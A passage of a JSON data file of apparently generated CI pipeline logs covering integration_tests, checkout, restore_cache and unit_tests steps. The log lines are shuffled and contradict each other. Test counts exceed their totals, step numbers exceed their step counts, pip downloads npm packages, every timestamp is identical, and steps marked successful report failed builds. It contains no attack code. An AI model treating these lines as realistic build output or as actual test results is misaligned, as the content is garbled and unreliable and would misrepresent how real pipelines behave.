          "[12:46:59] DEBUG: Initializing service",
          "Step 15/25: Testing",
          "\u2713 test completed",
          "[12:46:59] INFO: Starting build process",
          "Tests: 465 passed, 87 total",
          "Ready.",
          "Coverage: 92% statements, 65% branches",
          "Compiling src/service.java...",
          "\u2713 Task completed in 2154ms",
          "Verifying...",
          "npm install: added 64 packages",
          "Optimizing 84 modules...",
          "  PASS: unit/test_api_health.spec.js",
          "Switched to branch 'hotfix/task-876'",
          "Environment: development",
          "Transforming 541 files...",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-12-02T12:49:43.851043",
        "finished_at": "2025-12-02T12:50:13.694645",
        "log_lines": [
          "=== Step: integration_tests ===",
          "Bundling styles.css",
          "Using Python 3.11",
          "npm notice: package.json updated",
          "Step 5/18: Running migrations",
          "\u2717 build failed with exit code 108",
          "Fetching from https://amazonaws.com/package.json",
          "Completed.",
          "Layer 6/13: RUN command",
          "Uploading artifact 'build' (48 files)",
          "Artifact downloaded: 19MB",
          "pip: Installing build dependencies...",
          "Uploading artifact 'dist' (46 files)",
          "Finished.",
          "Verifying...",
          "Success!",
          "[12:46:59] DEBUG: Initializing service",
          "[12:46:59] INFO: Connecting to database",
          "[12:46:59] DEBUG: Connection pool: 19 active",
          "Transforming 288 files...",
          "Step 2/18: Running migrations",
          "Bundling runtime.js",
          "Using Python 3.10",
          "Generating source maps...",
          "[12:46:59] DEBUG: Query executed in 31ms",
          "Compiling lib/app.ts...",
          "npm install: resolved 324 packages",
          "\u2713 All checks passed",
          "\u2713 All checks passed",
          "npm install: resolved 565 packages",
          "[12:46:59] DEBUG: Initializing service",
          "Verifying...",
          "\u2713 Task completed in 2484ms",
          "Cache restored successfully (398MB)",
          "pip: Collecting jest",
          "Artifact uploaded: dist.zip (4MB)",
          "WARNING: lodash has known vulnerabilities",
          "Building Docker image...",
          "[12:46:59] DEBUG: Memory usage: 1516MB",
          "Step 14/23: Linting",
          "[12:46:59] INFO: Starting build process",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:46:59] WARN: Deprecated API usage",
          "WARNING: eslint has known vulnerabilities",
          "Transforming 927 files...",
          "Environment: production",
          "Done.",
          "pip: Downloading webpack-4.9.tar.gz",
          "[12:46:59] WARN: Deprecated API usage",
          "Bundling main.js",
          "[12:46:59] DEBUG: Initializing service",
          "Bundling main.css",
          "Finished.",
          "Bundling vendor.css",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Using Node.js 18.5.4",
          "\u2713 Step 'build' succeeded",
          "Environment: staging",
          "Processing...",
          "WARNING: react has known vulnerabilities",
          "Verifying...",
          "Compiling src/utils.go...",
          "Time: 66.990s",
          "[12:46:59] WARN: Deprecated API usage",
          "TLS handshake completed",
          "Bundling runtime.css",
          "[12:46:59] ERROR: Connection failed",
          "Step 13/22: Testing",
          "pip: Collecting lodash",
          "Step 11/24: Linting",
          "WARNING: axios has known vulnerabilities",
          "Step 18/16: Installing dependencies",
          "pip: Installing build dependencies...",
          "Cache saved successfully",
          "Success!",
          "Switched to branch 'hotfix/task-953'",
          "Artifact downloaded: 24MB",
          "Finished.",
          "Step 3/24: Running migrations",
          "Environment: staging",
          "Step 12/15: Installing dependencies",
          "WARNING: react has known vulnerabilities",
          "Already up to date.",
          "[12:46:59] DEBUG: Loading configuration",
          "pip: Installing build dependencies...",
          "Platform: darwin-arm64",
          "\u2713 lint completed",
          "Checking out main branch",
          "Connection established",
          "Minifying vendor.js",
          "Building Docker image...",
          "Pulling image: python:3.11",
          "Installing webpack@3.20.9",
          "Completed.",
          "Compiling lib/handler.rs...",
          "Bundling runtime.js",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Bundling runtime.js",
          "Artifact downloaded: 28MB",
          "Environment: staging",
          "Finished.",
          "\u2713 validate completed",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Connection established",
          "Cache restored successfully (165MB)",
          "pip install: Successfully installed eslint-2.11",
          "Image pulled successfully",
          "npm install: resolved 1422 packages",
          "Switched to branch 'bugfix/task-296'",
          "[12:46:59] WARN: Deprecated API usage",
          "Step 14/23: Linting",
          "Time: 45.897s",
          "  PASS: e2e/test_api_health.spec.js",
          "Tests: 83 passed, 325 total",
          "Uploading artifact 'build' (28 files)",
          "Step 11/15: Testing",
          "Time: 68.435s",
          "Pulling image: python:3.11",
          "Transforming 701 files...",
          "[12:46:59] INFO: Cache refreshed",
          "Compiling lib/index.js...",
          "Step 7/22: Deploying",
          "Cache restored successfully (496MB)",
          "Step 4/15: Building",
          "Artifact uploaded: build.tar.gz (19MB)",
          "\u2713 test completed",
          "Step 6/20: Building",
          "Cache invalidated: dependencies",
          "[12:46:59] ERROR: Connection failed",
          "Transforming 802 files...",
          "Image pulled successfully",
          "Cache restored successfully (266MB)",
          "Installing express@1.8.8",
          "Already up to date.",
          "Creating production build...",
          "Ready.",
          "Transforming 201 files...",
          "Pushing to registry...",
          "Switched to branch 'bugfix/task-887'",
          "Processing...",
          "Transforming 461 files...",
          "\u2713 Step 'install' succeeded",
          "Cache saved successfully",
          "Transforming 720 files...",
          "Waiting...",
          "Environment: staging",
          "Creating production build...",
          "Cache restored successfully (439MB)",
          "[12:46:59] INFO: Processing request",
          "[12:46:59] INFO: Cache refreshed",
          "Cache restored successfully (20MB)",
          "Compiling utils/app.ts...",
          "Waiting...",
          "Step 13/20: Building",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Cache restored successfully (257MB)",
          "FAILED: test_user_create",
          "Cache saved successfully",
          "Step 1/20: Running migrations",
          "Optimizing 52 modules...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "GET /health - 204 (60ms)",
          "Creating production build...",
          "npm install: resolved 1682 packages",
          "Step 7/15: Running migrations",
          "[12:46:59] DEBUG: Loading configuration",
          "OK",
          "[12:46:59] ERROR: Connection failed",
          "pip install: Successfully installed prettier-5.11",
          "[12:46:59] INFO: Connecting to database",
          "Building Docker image...",
          "\u2713 Step 'install' succeeded",
          "FAILED: test_api_health",
          "Using Node.js 19.11.5",
          "Pushing to registry...",
          "Loading...",
          "pip install: Successfully installed eslint-4.15",
          "Building Docker image...",
          "Creating production build...",
          "FAILED: test_user_create",
          "Building Docker image...",
          "Uploading artifact 'coverage' (27 files)",
          "Already up to date.",
          "[12:46:59] INFO: Connecting to database",
          "Fetching from https://githubusercontent.com/package.json",
          "Cache hit for key-9421",
          "Cache miss for key-2544",
          "Using Python 3.9",
          "Pulling image: node:3.11",
          "Minifying vendor.js",
          "Ready.",
          "pip: Collecting eslint",
          "Connection established",
          "Artifact uploaded: dist.zip (93MB)",
          "Step 1/17: Linting",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Bundling main.js",
          "Cache hit for key-1771",
          "Fetching from https://pypi.org/package.json",
          "pip install: Successfully installed axios-5.18",
          "Success!",
          "Building Docker image...",
          "Using Python 3.9",
          "Using Node.js 18.19.4",
          "WARNING: axios has known vulnerabilities",
          "Transforming 289 files...",
          "TLS handshake completed",
          "npm install: added 11 packages",
          "Switched to branch 'bugfix/task-837'",
          "Building Docker image...",
          "Checking out main branch",
          "Compiling src/main.py...",
          "Platform: darwin-arm64",
          "[12:46:59] INFO: Connecting to database",
          "Fetching from https://googleapis.com/package.json",
          "Cache hit for key-1282",
          "NODE_ENV=test",
          "npm install: added 470 packages",
          "Ran 121 tests in 14s",
          "  PASS: test_api_health (226ms)",
          "Connection established",
          "\u2713 Task completed in 3426ms",
          "Minifying main.js",
          "npm notice: created a lockfile",
          "Switched to branch 'bugfix/task-620'",
          "Pushing to registry...",
          "Waiting...",
          "Uploading artifact 'coverage' (48 files)",
          "  PASS: integration/test_auth_login.spec.js",
          "Platform: darwin-arm64",
          "[12:46:59] INFO: Processing request",
          "[12:46:59] INFO: Starting build process",
          "\u2713 build completed",
          "Artifact downloaded: 40MB",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-02T12:50:13.694645",
        "finished_at": "2025-12-02T12:50:19.663365",
        "log_lines": [
          "=== Step: checkout ===",
          "Already up to date.",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 15/21: Testing",
          "HEAD is now at 9574879",
          "[12:46:59] INFO: Cache refreshed",
          "Test Suites: 8 passed, 18 total",
          "npm install: added 388 packages",
          "npm notice: created a lockfile",
          "Compiling utils/utils.go...",
          "Verifying...",
          "Bundling styles.js",
          "WARNING: express has known vulnerabilities",
          "Step 19/16: Deploying",
          "Loading...",
          "Waiting...",
          "pip install: Successfully installed prettier-5.4",
          "Compiling src/main.py...",
          "Cache hit for key-6900",
          "pip: Downloading webpack-1.11.tar.gz",
          "Bundling vendor.css",
          "[12:46:59] WARN: Deprecated API usage",
          "  PASS: e2e/test_auth_login.spec.js",
          "Cache saved successfully",
          "pip: Downloading lodash-2.3.tar.gz",
          "\u2713 All checks passed",
          "Compiling lib/handler.rs...",
          "Step 10/15: Testing",
          "Platform: darwin-arm64",
          "Loading...",
          "Waiting...",
          "[12:46:59] WARN: Deprecated API usage",
          "Time: 14.548s",
          "\u2713 Step 'setup' succeeded",
          "Building Docker image...",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Generating source maps...",
          "Cache saved successfully",
          "Snapshots: 47 passed, 47 total",
          "\u2713 All checks passed",
          "POST /data - 200 (274ms)",
          "Tests: 111 passed, 184 total",
          "Done.",
          "Snapshots: 32 passed, 38 total",
          "Using Python 3.11",
          "Cache miss for key-4444",
          "Verifying...",
          "Compiling lib/index.js...",
          "Platform: linux-x64",
          "  PASS: test_user_create (170ms)",
          "yarn add: Done in 27.47s",
          "Artifact downloaded: 3MB",
          "Coverage: 88% statements, 83% branches",
          "POST /upload - 200 (74ms)",
          "Using Node.js 14.9.9",
          "[12:46:59] DEBUG: Query executed in 46ms",
          "Step 20/24: Testing",
          "\u2713 Task completed in 1037ms",
          "Fetching from https://googleapis.com/package.json",
          "[12:46:59] DEBUG: Connection pool: 14 active",
          "Image pulled successfully",
          "Coverage: 79% statements, 77% branches",
          "Time: 86.247s",
          "Building Docker image...",
          "Transforming 639 files...",
          "npm install: resolved 446 packages",
          "Bundling styles.js",
          "Switched to branch 'bugfix/task-652'",
          "Cache hit for key-9506",
          "Optimizing 13 modules...",
          "Compiling components/app.ts...",
          "Step 1/20: Linting",
          "Using Node.js 14.16.7",
          "npm notice: package.json updated",
          "Generating source maps...",
          "Time: 3.505s",
          "\u2717 build failed with exit code 123",
          "Coverage: 84% statements, 82% branches",
          "Installing webpack@2.20.8",
          "Cache hit for key-4914",
          "Step 10/19: Linting",
          "WARNING: eslint has known vulnerabilities",
          "Checking out master branch",
          "Pushing to registry...",
          "[12:46:59] INFO: Connecting to database",
          "Connection established",
          "Step 18/19: Testing",
          "Already up to date.",
          "Using Node.js 18.13.0",
          "Compiling utils/index.js...",
          "[12:46:59] WARN: Deprecated API usage",
          "Coverage: 79% statements, 61% branches",
          "HEAD is now at 745c770",
          "[12:46:59] INFO: Processing request",
          "[12:46:59] INFO: Cache refreshed",
          "\u2713 Step 'setup' succeeded",
          "Ran 47 tests in 54s",
          "[12:46:59] INFO: Request completed",
          "Cache restored successfully (427MB)",
          "[12:46:59] ERROR: Connection failed",
          "pip: Downloading webpack-3.7.tar.gz",
          "Tests: 309 passed, 424 total",
          "Tests: 295 passed, 265 total",
          "HEAD is now at 2d217bc",
          "\u2713 Step 'checkout' succeeded",
          "yarn add: Done in 16.63s",
          "Pulling image: python:3.11",
          "pip: Downloading express-4.10.tar.gz",
          "[12:46:59] INFO: Cache refreshed",
          "Pushing to registry...",
          "Transforming 371 files...",
          "WARNING: express has known vulnerabilities",
          "[12:46:59] DEBUG: Memory usage: 770MB",
          "\u2713 test completed",
          "Snapshots: 29 passed, 21 total",
          "\u2713 package completed",
          "[12:46:59] INFO: Connecting to database",
          "NODE_ENV=development",
          "WARNING: webpack has known vulnerabilities",
          "\u2713 deploy completed",
          "Finished.",
          "Fetching from https://gcr.io/package.json",
          "Already up to date.",
          "Artifact uploaded: build.tar.gz (6MB)",
          "[12:46:59] WARN: Deprecated API usage",
          "HEAD is now at 98099cd",
          "Processing...",
          "Creating production build...",
          "Step 1/17: Installing dependencies",
          "WARNING: jest has known vulnerabilities",
          "Compiling src/service.java...",
          "Step 13/24: Deploying",
          "Step 19/16: Building",
          "[12:46:59] INFO: Cache refreshed",
          "Ran 131 tests in 9s",
          "HEAD is now at efb2a5f",
          "Transforming 890 files...",
          "Artifact uploaded: build.tar.gz (47MB)",
          "POST /data - 201 (285ms)",
          "Using Python 3.10",
          "Step 4/15: Installing dependencies",
          "[12:46:59] DEBUG: Loading configuration",
          "Step 16/21: Installing dependencies",
          "Checking out master branch",
          "[12:46:59] INFO: Request completed",
          "npm install: added 153 packages",
          "Platform: win32-x64",
          "Fetching from https://amazonaws.com/package.json",
          "  PASS: test_api_health (42ms)",
          "Compiling src/service.java...",
          "[12:46:59] INFO: Connecting to database",
          "Pushing to registry...",
          "Test Suites: 47 passed, 6 total",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling components/app.ts...",
          "Step 19/25: Testing",
          "\u2713 All checks passed",
          "WARNING: react has known vulnerabilities",
          "Test Suites: 47 passed, 47 total",
          "Success!",
          "Minifying app.js",
          "Step 16/22: Running migrations",
          "NODE_ENV=development",
          "Artifact downloaded: 1MB",
          "Minifying vendor.js",
          "Already up to date.",
          "[12:46:59] INFO: Processing request",
          "[12:46:59] INFO: Starting build process",
          "Exception: NullPointerException",
          "Artifact downloaded: 15MB",
          "Platform: win32-x64",
          "Minifying app.js",
          "Cache hit for key-6571",
          "POST /upload - 202 (445ms)",
          "TLS handshake completed",
          "Step 6/19: Running migrations",
          "  PASS: unit/test_auth_login.spec.js",
          "Artifact uploaded: build.tar.gz (21MB)",
          "yarn add: Done in 29.79s",
          "Test Suites: 11 passed, 30 total",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Test Suites: 30 passed, 13 total",
          "Installing react@4.10.2",
          "Platform: darwin-arm64",
          "  PASS: e2e/test_cache_hit.spec.js",
          "Snapshots: 24 passed, 30 total",
          "pip: Downloading jest-4.10.tar.gz",
          "[12:46:59] INFO: Starting build process",
          "npm notice: created a lockfile",
          "pip: Installing build dependencies...",
          "Minifying app.js",
          "\u2717 build failed with exit code 54",
          "  PASS: integration/test_user_create.spec.js",
          "Step 19/25: Installing dependencies",
          "[12:46:59] INFO: Starting build process",
          "Step 2/22: Linting",
          "Verifying...",
          "OK",
          "Transforming 771 files...",
          "Step 1/15: Linting",
          "OK",
          "[12:46:59] DEBUG: Initializing service",
          "Uploading artifact 'build' (43 files)",
          "POST /upload - 201 (360ms)",
          "Cache invalidated: node_modules",
          "Processing...",
          "[12:46:59] WARN: Deprecated API usage",
          "Finished.",
          "Optimizing 11 modules...",
          "pip: Collecting react",
          "  PASS: test_cache_hit (200ms)",
          "Transforming 416 files...",
          "[12:46:59] INFO: Cache refreshed",
          "Compiling lib/app.ts...",
          "Compiling src/handler.rs...",
          "Building Docker image...",
          "npm notice: package.json updated",
          "pip: Installing build dependencies...",
          "GET /health - 204 (7ms)",
          "Compiling lib/handler.rs...",
          "pip: Installing build dependencies...",
          "WARNING: react has known vulnerabilities",
          "Verifying...",
          "pip: Downloading jest-1.17.tar.gz",
          "pip install: Successfully installed express-2.13",
          "Snapshots: 8 passed, 30 total",
          "Compiling utils/main.py...",
          "Ran 21 tests in 40s",
          "pip: Downloading eslint-2.2.tar.gz",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:46:59] DEBUG: Connection pool: 14 active",
          "WARNING: prettier has known vulnerabilities",
          "Using Python 3.12",
          "Finished.",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-12-02T12:50:19.663365",
        "finished_at": "2025-12-02T12:50:28.616446",
        "log_lines": [
          "=== Step: restore_cache ===",
          "Exception: ValueError",
          "Step 12/24: Deploying",
          "OK",
          "Environment: development",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:46:59] DEBUG: Connection pool: 10 active",
          "[12:46:59] DEBUG: Loading configuration",
          "Using Python 3.10",
          "npm install: added 349 packages",
          "Artifact uploaded: dist.zip (44MB)",
          "Cache hit for key-3531",
          "Already up to date.",
          "npm install: resolved 1788 packages",
          "[12:46:59] ERROR: Connection failed",
          "\u2713 Task completed in 2384ms",
          "pip: Downloading webpack-2.5.tar.gz",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:46:59] INFO: Processing request",
          "Step 12/16: Linting",
          "[12:46:59] WARN: Deprecated API usage",
          "GET /health - 200 (80ms)",
          "Step 6/24: Building",
          "Pushing to registry...",
          "Step 9/15: Deploying",
          "pip: Collecting express",
          "pip install: Successfully installed react-3.3",
          "Step 8/15: Linting",
          "Already up to date.",
          "npm notice: created a lockfile",
          "NODE_ENV=production",
          "  PASS: test_user_create (20ms)",
          "Step 12/17: Linting",
          "[12:46:59] DEBUG: Query executed in 18ms",
          "Test Suites: 46 passed, 29 total",
          "Verifying...",
          "Pulling image: alpine:latest",
          "Exception: ValueError",
          "Compiling components/handler.rs...",
          "NODE_ENV=production",
          "Pulling image: node:latest",
          "[12:46:59] INFO: Processing request",
          "[12:46:59] DEBUG: Memory usage: 258MB",
          "NODE_ENV=production",
          "Waiting...",
          "Waiting...",
          "\u2713 Task completed in 4875ms",
          "[12:46:59] INFO: Request completed",
          "Switched to branch 'feature/task-739'",
          "Snapshots: 12 passed, 37 total",
          "Loading...",
          "WARNING: webpack has known vulnerabilities",
          "Already up to date.",
          "Minifying app.js",
          "Loading...",
          "Layer 7/9: COPY command",
          "Cache saved successfully",
          "pip: Collecting lodash",
          "[12:46:59] INFO: Request completed",
          "npm install: resolved 296 packages",
          "Ready.",
          "Transforming 587 files...",
          "Installing express@2.9.2",
          "\u2713 All checks passed",
          "Compiling lib/index.js...",
          "Done.",
          "pip: Downloading webpack-4.10.tar.gz",
          "[12:46:59] INFO: Request completed",
          "Step 5/17: Testing",
          "Switched to branch 'bugfix/task-422'",
          "Completed.",
          "Loading...",
          "[12:46:59] INFO: Connecting to database",
          "[12:46:59] INFO: Processing request",
          "NODE_ENV=development",
          "Environment: production",
          "npm notice: created a lockfile",
          "Time: 26.845s",
          "Coverage: 97% statements, 68% branches",
          "Installing lodash@2.4.8",
          "Verifying...",
          "Loading...",
          "Step 6/20: Installing dependencies",
          "Generating source maps...",
          "Cache invalidated: build",
          "NODE_ENV=production",
          "Platform: darwin-arm64",
          "Uploading artifact 'coverage' (16 files)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Fetching from https://registry.npmjs.org/package.json",
          "npm install: added 404 packages",
          "Cache miss for key-8523",
          "Finished.",
          "[12:46:59] WARN: Deprecated API usage",
          "  PASS: test_api_health (345ms)",
          "Ready.",
          "\u2713 Step 'checkout' succeeded",
          "Pulling image: node:18",
          "pip install: Successfully installed eslint-5.20",
          "Waiting...",
          "Compiling lib/main.py...",
          "pip: Installing build dependencies...",
          "Tests: 405 passed, 101 total",
          "Completed.",
          "Compiling components/app.ts...",
          "Uploading artifact 'dist' (22 files)",
          "Transforming 818 files...",
          "[12:46:59] WARN: Deprecated API usage",
          "Image pulled successfully",
          "Cache restored successfully (358MB)",
          "\u2713 All checks passed",
          "[12:46:59] DEBUG: Connection pool: 13 active",
          "Transforming 568 files...",
          "Completed.",
          "FAILED: test_auth_login",
          "[12:46:59] DEBUG: Connection pool: 16 active",
          "Coverage: 86% statements, 92% branches",
          "Verifying...",
          "Step 15/23: Running migrations",
          "Processing...",
          "OK",
          "Compiling src/service.java...",
          "Artifact uploaded: dist.zip (15MB)",
          "Success!",
          "npm notice: package.json updated",
          "Using Python 3.11",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Verifying...",
          "pip: Collecting react",
          "Compiling src/service.java...",
          "POST /upload - 200 (415ms)",
          "Already up to date.",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Image pulled successfully",
          "Processing...",
          "[12:46:59] ERROR: Connection failed",
          "\u2713 Task completed in 599ms",
          "Coverage: 93% statements, 80% branches",
          "[12:46:59] DEBUG: Query executed in 38ms",
          "Ready.",
          "NODE_ENV=development",
          "Loading...",
          "Waiting...",
          "WARNING: axios has known vulnerabilities",
          "[12:46:59] INFO: Cache refreshed",
          "Compiling utils/app.ts...",
          "Artifact uploaded: dist.zip (21MB)",
          "[12:46:59] ERROR: Connection failed",
          "Pushing to registry...",
          "Creating production build...",
          "Step 17/21: Testing",
          "pip: Collecting eslint",
          "OK",
          "Transforming 982 files...",
          "Environment: development",
          "GET /status - 201 (63ms)",
          "Creating production build...",
          "Compiling utils/main.py...",
          "pip install: Successfully installed jest-1.9",
          "pip: Collecting axios",
          "WARNING: express has known vulnerabilities",
          "pip: Collecting axios",
          "pip install: Successfully installed axios-2.9",
          "NODE_ENV=production",
          "Ran 170 tests in 6s",
          "Image pulled successfully",
          "Artifact uploaded: dist.zip (62MB)",
          "[12:46:59] DEBUG: Query executed in 98ms",
          "npm install: resolved 436 packages",
          "Success!",
          "POST /upload - 200 (331ms)",
          "Cache invalidated: dependencies",
          "[12:46:59] WARN: Deprecated API usage",
          "[12:46:59] DEBUG: Memory usage: 445MB",
          "Processing...",
          "Switched to branch 'hotfix/task-307'",
          "[12:46:59] DEBUG: Loading configuration",
          "[12:46:59] WARN: Deprecated API usage",
          "Compiling utils/service.java...",
          "yarn add: Done in 13.78s",
          "\u2713 Task completed in 1458ms",
          "Environment: test",
          "Artifact uploaded: dist.zip (73MB)",
          "Time: 93.198s",
          "Test Suites: 13 passed, 35 total",
          "Step 2/23: Linting",
          "Step 20/17: Deploying",
          "Transforming 272 files...",
          "WARNING: eslint has known vulnerabilities",
          "Already up to date.",
          "\u2713 All checks passed",
          "Completed.",
          "Minifying app.js",
          "yarn add: Done in 3.74s",
          "Test Suites: 43 passed, 33 total",
          "[12:46:59] ERROR: Connection failed",
          "Ready.",
          "[12:46:59] WARN: Deprecated API usage",
          "npm install: added 149 packages",
          "Installing express@2.3.6",
          "FAILED: test_auth_login",
          "Cache restored successfully (147MB)",
          "Pushing to registry...",
          "  PASS: test_db_connect (341ms)",
          "HEAD is now at 1e79fc3",
          "Compiling src/app.ts...",
          "Success!",
          "Step 3/21: Deploying",
          "Coverage: 100% statements, 70% branches",
          "Loading...",
          "Compiling utils/index.js...",
          "Installing webpack@5.14.1",
          "npm install: resolved 1389 packages",
          "[12:46:59] WARN: Deprecated API usage",
          "Environment: staging",
          "Snapshots: 6 passed, 47 total",
          "pip: Downloading express-4.9.tar.gz",
          "Done.",
          "Cache invalidated: build",
          "Minifying vendor.js",
          "Step 14/17: Running migrations",
          "Bundling main.css",
          "Compiling lib/handler.rs...",
          "Loading...",
          "npm notice: package.json updated",
          "Compiling src/app.ts...",
          "\u2713 All checks passed",
          "HEAD is now at 0593c71",
          "Step 3/20: Building",
          "Loading...",
          "Step 19/23: Linting",
          "  PASS: unit/test_api_health.spec.js",
          "Optimizing 81 modules...",
          "[12:46:59] DEBUG: Query executed in 30ms",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-12-02T12:50:28.616446",
        "finished_at": "2025-12-02T12:51:13.381849",
        "log_lines": [
          "=== Step: unit_tests ===",
          "[12:46:59] INFO: Connecting to database",
          "[12:46:59] ERROR: Connection failed",
          "Connection established",
          "WARNING: webpack has known vulnerabilities",
          "Pulling image: python:latest",
          "\u2717 build failed with exit code 1",
          "Transforming 193 files...",
          "Fetching from https://googleapis.com/package.json",
          "Ran 114 tests in 23s",
          "Uploading artifact 'build' (6 files)",
          "Ran 131 tests in 19s",
          "Ready.",
          "Tests: 164 passed, 330 total",
          "Success!",
          "Loading...",
          "FAILED: test_cache_hit",
          "Cache hit for key-9240",
          "Uploading artifact 'coverage' (18 files)",
          "Fetching from https://docker.io/package.json",
          "Platform: linux-x64",
          "Tests: 56 passed, 51 total",
          "Cache invalidated: build",
          "Image pulled successfully",
          "TLS handshake completed",
          "Exception: RuntimeError",
          "Compiling src/main.py...",
          "OK",
          "Generating source maps...",
          "Switched to branch 'hotfix/task-220'",
          "Transforming 816 files...",
          "  PASS: e2e/test_user_create.spec.js",
          "Transforming 668 files...",
          "Waiting...",
          "Pushing to registry...",
          "WARNING: axios has known vulnerabilities",
          "[12:46:59] WARN: Deprecated API usage",
          "yarn add: Done in 9.18s",
          "Transforming 512 files...",
          "Transforming 719 files...",
          "NODE_ENV=production",
          "Coverage: 89% statements, 65% branches",
          "yarn add: Done in 19.46s",
          "[12:46:59] INFO: Request completed",
          "Switched to branch 'feature/task-730'",
          "[12:46:59] DEBUG: Connection pool: 4 active",
          "Compiling src/handler.rs...",
          "Pushing to registry...",
          "\u2713 Task completed in 4128ms",
          "Artifact uploaded: dist.zip (39MB)",
          "Fetching submodules...",
          "Minifying app.js",
          "Cache miss for key-3272",
          "Switched to branch 'bugfix/task-639'",
          "Generating source maps...",
          "Completed.",
          "Artifact uploaded: dist.zip (4MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "pip: Downloading prettier-3.6.tar.gz",
          "Image pulled successfully",
          "[12:46:59] DEBUG: Connection pool: 16 active",
          "[12:46:59] DEBUG: Query executed in 32ms",
          "Compiling src/app.ts...",
          "Creating production build...",
          "Cache invalidated: build",
          "HEAD is now at 3986eba",
          "WARNING: express has known vulnerabilities",
          "[12:46:59] INFO: Cache refreshed",
          "[12:46:59] DEBUG: Initializing service",
          "POST /upload - 200 (37ms)",
          "NODE_ENV=development",
          "\u2713 lint completed",
          "npm notice: package.json updated",
          "Ready.",
          "Optimizing 63 modules...",
          "NODE_ENV=production",
          "Using Node.js 15.7.7",
          "yarn add: Done in 23.95s",
          "Using Node.js 15.13.10",
          "yarn add: Done in 17.71s",
          "pip: Downloading webpack-5.18.tar.gz",
          "[12:46:59] DEBUG: Loading configuration",
          "Processing...",
          "Layer 2/14: RUN command",
          "Coverage: 72% statements, 61% branches",
          "Step 5/15: Building",
          "Building Docker image...",
          "  PASS: e2e/test_db_connect.spec.js",
          "Artifact uploaded: dist.zip (43MB)",
          "[12:46:59] INFO: Request completed",
          "Pushing to registry...",
          "pip install: Successfully installed jest-5.20",
          "Processing...",
          "pip install: Successfully installed axios-4.4",
          "WARNING: lodash has known vulnerabilities",
          "[12:46:59] DEBUG: Connection pool: 10 active",
          "Tests: 331 passed, 422 total",
          "pip: Downloading lodash-4.12.tar.gz",
          "Ready.",
          "Exception: RuntimeError",
          "WARNING: axios has known vulnerabilities",
          "Step 20/21: Testing",
          "[12:46:59] INFO: Processing request",
          "Cache hit for key-1065",
          "pip: Downloading prettier-5.9.tar.gz",
          "Step 4/24: Building",
          "Transforming 392 files...",
          "[12:46:59] DEBUG: Connection pool: 13 active",
          "Step 16/21: Deploying",
          "Layer 10/12: ENV command",
          "Environment: development",
          "  PASS: test_api_health (302ms)",
          "TLS handshake completed",
          "[12:46:59] INFO: Request completed",
          "npm notice: package.json updated",
          "[12:46:59] DEBUG: Connection pool: 19 active",
          "TLS handshake completed",
          "Transforming 215 files...",
          "[12:46:59] INFO: Processing request",
          "[12:46:59] WARN: Deprecated API usage",
          "Waiting...",
          "Step 15/23: Deploying",
          "Step 5/15: Building",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Pulling image: python:3.11",
          "Checking out master branch",
          "[12:46:59] ERROR: Connection failed",
          "Optimizing 26 modules...",
          "Ran 147 tests in 9s",
          "\u2713 Task completed in 2938ms",
          "Cache miss for key-4117",
          "Time: 86.512s",
          "Artifact uploaded: dist.zip (84MB)",
          "Artifact downloaded: 25MB",
          "npm notice: package.json updated",
          "Transforming 132 files...",
          "Uploading artifact 'build' (38 files)",
          "[12:46:59] DEBUG: Memory usage: 1030MB",
          "Installing react@4.8.9",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "  PASS: e2e/test_api_health.spec.js",
          "Cache saved successfully",
          "Step 18/20: Running migrations",
          "Artifact downloaded: 25MB",
          "Coverage: 70% statements, 71% branches",
          "Step 10/19: Linting",
          "Verifying...",
          "Pushing to registry...",
          "Cache miss for key-3343",
          "Snapshots: 24 passed, 11 total",
          "[12:46:59] INFO: Request completed",
          "Optimizing 90 modules...",
          "Uploading artifact 'dist' (24 files)",
          "Ready.",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Checking out main branch",
          "[12:46:59] INFO: Processing request",
          "Step 19/17: Deploying",
          "Verifying...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "NODE_ENV=production",
          "Done.",
          "Pulling image: node:latest",
          "Test Suites: 32 passed, 35 total",
          "Transforming 123 files...",
          "Artifact downloaded: 31MB",
          "Step 18/20: Running migrations",
          "[12:46:59] WARN: Deprecated API usage",
          "Pulling image: node:latest",
          "Processing...",
          "Using Python 3.11",
          "pip: Installing build dependencies...",
          "[12:46:59] INFO: Request completed",
          "pip: Downloading axios-2.9.tar.gz",
          "Fetching from https://googleapis.com/package.json",
          "Exception: TypeError",
          "Done.",
          "Done.",
          "Ready.",
          "Building Docker image...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Connection established",
          "Building Docker image...",
          "Step 17/21: Building",
          "  PASS: test_db_connect (182ms)",
          "Processing...",
          "Loading...",
          "NODE_ENV=development",
          "Fetching from https://pypi.org/package.json",
          "Cache restored successfully (102MB)",
          "Compiling utils/app.ts...",
          "Compiling src/index.js...",
          "Cache hit for key-1143",
          "Using Python 3.11",
          "[12:46:59] DEBUG: Memory usage: 806MB",
          "Environment: production",
